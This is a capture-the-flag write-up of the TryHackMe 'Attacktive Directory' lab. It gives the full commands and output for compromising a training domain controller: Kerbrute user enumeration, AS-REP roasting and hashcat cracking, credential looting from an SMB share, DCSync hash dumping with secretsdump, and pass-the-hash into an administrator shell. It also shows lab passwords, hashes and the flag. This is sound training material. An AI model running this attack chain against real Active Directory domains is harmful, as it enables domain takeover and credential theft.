+++
title = 'Exploiting Active Directory: How to Abuse Kerberos'
date = 2024-08-08T15:43:06+02:00
slug = "exploitng-active-directory"
+++

![Kerberos logo](/kerberos-logo.png)

This will be a write-up post for the [Attacktive Directory](https://tryhackme.com/r/room/attacktivedirectory) room on [TryHackMe](https://tryhackme.com). It's a learning room in the Cyber Defense path, under the Threat Emulation section. The idea is to attempt to exploit a vulnerable Domain Controller in Active Directory.

[Active Directory (AD)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview) is Microsoft's directory and identity management service designed for Windows domain networks. Introduced with Windows 2000 and included with most MS Windows Server operating systems, it is utilized by various Microsoft solutions such as Exchange Server and SharePoint Server, along with numerous third-party applications and services.

## Enumeration
---

For this part, we'll need to answer a few questions:
- What tool will allow us to enumerate port 139/445?
- What is the NetBIOS-Domain Name of the machine?
- What invalid TLD do people commonly use for their Active Directory Domain?

Initially, we'll start with enumeration of the target to detect which ports and services are available on the target machine. We'll start with an nmap scan:

```cmd
┌──(ognard㉿kali)-[~/Tools]
└─$ nmap -sV -sS 10.10.97.177

Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-07 12:42 BST
Nmap scan report for ip-10-10-97-177.eu-west-1.compute.internal (10.10.97.177)
Host is up (0.0049s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-07 11:43:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2024-08-06T10:39:18
|_Not valid after:  2025-02-05T10:39:18
|_ssl-date: 2024-08-07T11:43:44+00:00; 0s from scanner time.
MAC Address: 02:7B:27:9B:F3:43 (Unknown)
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: ATTACKTIVEDIREC, NetBIOS user: <unknown>, NetBIOS MAC: 02:7b:27:9b:f3:43 (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-08-07 12:43:44
|_  start_date: 1600-12-31 23:58:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.70 seconds
```

This scan shows a lot of open ports on the target machine. Some of the ports and services that are important for all these tasks are:

- 88 kerberos-sec
- 139 netbios-ssn
- 389 ldap - we can get the domain and TLD here
- 445 microsoft-ds
- 3268 ldap - we can get the domain and TLD here

However, it doesn't provide the correct answer to the second question about the NetBIOS-Domain Name of the machine. Since the first question suggests that there is another tool for enumerating ports 139 and 445, we'll use another tool called enum4linux in the hope of getting more information and answering the second question.

```cmd
┌──(ognard㉿kali)-[~/Tools]
└─$ enum4linux -M 10.10.97.177 

WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Aug  7 12:49:08 2024

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.97.177
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.97.177    |
 ==================================================== 
[+] Got domain/workgroup name: THM-AD

 ===================================== 
|    Session Check on 10.10.97.177    |
 ===================================== 
[+] Server 10.10.97.177 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.97.177    |
 =========================================== 
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[+] Host is part of a domain (not a workgroup)

 =========================================== 
|    Machine Enumeration on 10.10.97.177    |
 =========================================== 
[E] Internal error.  Not implemented in this version of enum4linux.
enum4linux complete on Wed Aug  7 12:49:08 2024
```

> You can use enum4linux with -M flag to get the machine(s) list. Use the `enum4linux -h` command for more information on how to use the tool.

From the output, we can see that the Domain Name of the machine is THM-AD; therefore, we have the answer to the second question as well.

Now, for the third question, at first, honestly, I wasn't really sure what the correct answer was. The hint gives away a spoiler ("Spoiler: The full AD domain is spookysec.local"), and the answer field has a dot before the asterisks. I guessed that the answer was .local. We can see this bit of information in the nmap output above as well.

But this wasn’t a satisfying answer, and I wanted to learn why this Top Level Domain is invalid. So, I googled the question and tried to skip all of the existing write-ups so that I wouldn't get any spoilers for the upcoming tasks.

I found [this article by Jannick Hald](https://medium.com/@jannick.hald/local-domain-is-dead-a91c267c9889) by Jannick Hald that gave me a proper explanation of why one should avoid using .local as a TLD for AD. In summary:

> The use of the .local domain for Active Directory was a common practice in the past. It allowed organizations to create an internal domain that was not publicly registered and avoid potential conflicts with publicly registered domain names. However, in recent years, there has been a shift away from using the .local domain for several reasons:
> 
> - Name Collisions
> - SSL Certificate Challenges
> - Multitenancy and Federation
> - Best Practices and Future-Proofing
> 
> As a result of these considerations, Microsoft now recommends using a subdomain of a registered, publicly resolvable domain for Active Directory, such as corp.example.com or ad.example.com...

## Enumerating Users
---

Kerberos is a key authentication service within Active Directory. Since we know that the Kerberos service is running on the target machine, we can use a tool called Kerbrute to attempt brute-force discovery of users and passwords.

> As mentioned in the room, a modified [User List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) and [Password List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) will be used to decrease the time for enumeration of users and password hash cracking.

To find the answer to the first question for this section, you can simply run `./kerbrute -h`:

```cmd
┌──(ognard㉿kali)-[~/Tools]
└─$ ./kerbrute -h

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/08/24 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
```

Next, in order to answer the second question, we'll need to run a proper Kerbrute command against the previously known AD domain (spookysec.local):

```cmd
┌──(ognard㉿kali)-[~/Downloads]
└─$ ./kerbrute userenum --dc spookysec.local -d spookysec.local -t 100 userlist.txt   

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/07/24 - Ronnie Flathers @ropnop

2024/08/07 11:40:18 >  Using KDC(s):
2024/08/07 11:40:18 >   spookysec.local:88

2024/08/07 11:40:19 >  [+] VALID USERNAME:       james@spookysec.local
2024/08/07 11:40:19 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2024/08/07 11:40:19 >  [+] VALID USERNAME:       James@spookysec.local
2024/08/07 11:40:19 >  [+] VALID USERNAME:       robin@spookysec.local
2024/08/07 11:40:19 >  [+] VALID USERNAME:       darkstar@spookysec.local
2024/08/07 11:40:20 >  [+] VALID USERNAME:       administrator@spookysec.local
2024/08/07 11:40:21 >  [+] VALID USERNAME:       backup@spookysec.local
2024/08/07 11:40:21 >  [+] VALID USERNAME:       paradox@spookysec.local
2024/08/07 11:40:23 >  [+] VALID USERNAME:       JAMES@spookysec.local
2024/08/07 11:40:24 >  [+] VALID USERNAME:       Robin@spookysec.local
2024/08/07 11:40:28 >  [+] VALID USERNAME:       Administrator@spookysec.local
2024/08/07 11:40:36 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2024/08/07 11:40:39 >  [+] VALID USERNAME:       Paradox@spookysec.local
2024/08/07 11:40:48 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2024/08/07 11:40:51 >  [+] VALID USERNAME:       ori@spookysec.local
2024/08/07 11:40:56 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2024/08/07 11:41:08 >  Done! Tested 73317 usernames (16 valid) in 49.177 seconds
```

> NOTE: I had trouble using Kerbrute on THM's AttackBox; I was getting some errors, and after searching around, I found that the best way to solve the issue is to assign the target's IP to spookysec.local in /etc/hosts in order for the Kerbrute command to work with that domain.

After the enumeration, the result is that there are 16 valid usernames. To answer the second and third questions of this section, we need to provide these two notable accounts:

- svc-admin *(@spookysec.local)*
- backup *(@spookysec.local)*

## Abusing Kerberos
---

As instructed in this section, we are going to abuse a feature within Kerberos using an attack method known as ASREPRoasting. This occurs when a user account has the privilege 'Does not require Pre-Authentication' already set. This means that it is not required for that user account to provide valid identification before requesting a Kerberos Ticket.

There's a tool called GetNPUsers.py (check [Impacket](https://github.com/fortra/impacket)) that will allow us to query accounts (suitable for ASREPRoasting) from the Key Distribution Center. The only thing needed to query accounts is a valid set of usernames—in this case, we have two valid usernames we obtained through Kerbrute in the previous section.

Once the tool is downloaded, we can use the `GetNPUsers.py` tool to proceed and answer the questions from this section.

The answer to the first question in this section is pretty obvious—you can query a ticket from svc-admin without a password.

To answer the second question, we'll need to use the tool with the `svc-admin` user:

```cmd
┌──(ognard㉿kali)-[~/Downloads]
└─$ python3 GetNPUsers.py -dc-host spookysec.local spookysec.local/svc-admin -no-pass
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:b06128e4ae69b2e346ef49d9e65ccdd9$42b9351e746f1207f1b80ebcb1dd3d85e4e9b245625cd563319901103cb1480c510a397d248d5ea5b4b05ee7813709034c6653604f0c18463924cec2c2ea24b3a974ae1d9978bb793b8d7b4e87ee12caf359fe92dc4e7c327e40282b98472347c9bb16b68d2715276c00ce96b3240fc8090e614814134c3afe0183c5b37d8c2081adb256d6723b56e10201f00344b4badd7704c796d22567d524eaadaa24e63109d3ef4747fedada0f45336f35238e486dc92c64cf807f3d35a0485dfc81b3bf62556ddd1aa6316d8a5a95dfcea244b60beec607a35ac8a2b8c43706911eec10219c8fe72013445fb8144d2b5ebd9ca0603e
```

This will show a hash in the output. Checking the hash pattern on the [Hashcat Examples Wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes), we can see that the Hash-Name is `Kerberos 5, etype 23, AS-REP` and the Hash-Mode is `18200`. With this, we have the answers to the second and third questions in this section.

And now, for the final one, based on the discovered Hash-Mode, we'll need to crack the hash with hashcat and the password list we have from before:

```cmd
┌──(ognard㉿kali)-[~/Downloads]
└─$ hashcat -a 0 -m 18200 hash.txt passwordlist.txt --force
```

Once the process is complete, you will find the answer to the last question—the cracked password is `management2005`.

## Enumerating Shares
---

Now that we have valid credentials to access the domain, we can make an attempt to enumerate any shares that may be available in the domain controller.

We'll be using smbclient to map the remote SMB shares. To do that, use the following:

```cmd
┌──(ognard㉿kali)-[~]
└─$ smbclient -L \\\\spookysec.local\\ -U 'svc-admin'     
Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

From this, we can see that there are 6 remote shares in the server listing. Next, we are going to check what's inside the `backup` share and see if we can answer the fourth question from there.

```cmd
┌──(ognard㉿kali)-[~]
└─$ smbclient \\\\spookysec.local\\backup -U 'svc-admin'
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3667197 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit
```

As you can see from the example above, there is a file called backup_credentials.txt that sounds promising. Once we get the file to our local machine and preview its contents, we can see that there is a base64 string:

```cmd
┌──(ognard㉿kali)-[~]
└─$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw 
```

Once decoded, we can see an interesting finding:

```cmd
┌──(ognard㉿kali)-[~]
└─$ echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 --decode
backup@spookysec.local:backup2517860
```

## Privilege Escalation
---

Since in the previous step we discovered the credentials for the `backup` account, we can gain higher access to the system. It seems a bit obvious already that this account has a permission that allows all of the Active Directory changes to be synced with this account—this includes some exotic information, such as password hashes.

As per the instructions in this room's section, we're going to use another tool from Impacket called `secretsdump.py`, which will allow us to discover all of the password hashes that this backup account has available. By exploiting this, we'll have full control over the Active Directory Domain.

When we call the `secretsdump.py` script, we can preview all of the available options that we can use. Based on this information, we can see in this line

```cmd
...

-just-dc-user USERNAME
                        Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. Implies also -just-dc switch

...
```

that NTDS.DIT data extraction is only available for the DRSUAPI approach. Therefore, we have the answer to the first question.

Now, we'll put this tool into use:

```cmd
┌──(ognard㉿kali)-[~/Tools]
└─$ ./secretsdump.py -just-dc backup:backup2517860@spookysec.local
Impacket v0.12.0.dev1+20240807.21946.829239e3 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::

...

[*] Cleaning up... 
```

This will output users' hashes, but in our case, we'll need just the Administrator's hash.

>If you have some errors running `secretsdump.py`, make sure that you have all the dependencies installed on your machine. Basically, you can get the `requirements.txt` file from [Impacket repository](https://github.com/fortra/impacket) (or just clone the entire repo and run `pip3 install .` in the repo's root directory).

To answer the third question for this section, since I didn't know which method of attack would allow us to authenticate the user without the password, I just did a simple Google search. The [Pass-the-Hash](https://www.netwrix.com/pass_the_hash_attack_explained.html) attack is the appropriate answer.

The next step, as suggested in the last question for this section, is to use Evil-WinRM — a tool that will allow us to use a hash for authentication. Use `evil-winrm -h` to get more details.

```cmd
┌──(ognard㉿kali)-[~/Tools]
└─$ evil-winrm -i 10.10.104.97 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

And we're in!

## Submit Flags
---

The final thing we need to do is to find and submit the flags for three users: `Administrator`, `backup`, and `svc-admin`.

Since we are already in the Administrator, we can find these quite easily; after looking around, the flag text files are in the Desktop folders for all three users.


```cmd
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

That's it! Thank you for reading through, and please consider subscribing to my newsletter if you would like to receive each new post in your inbox.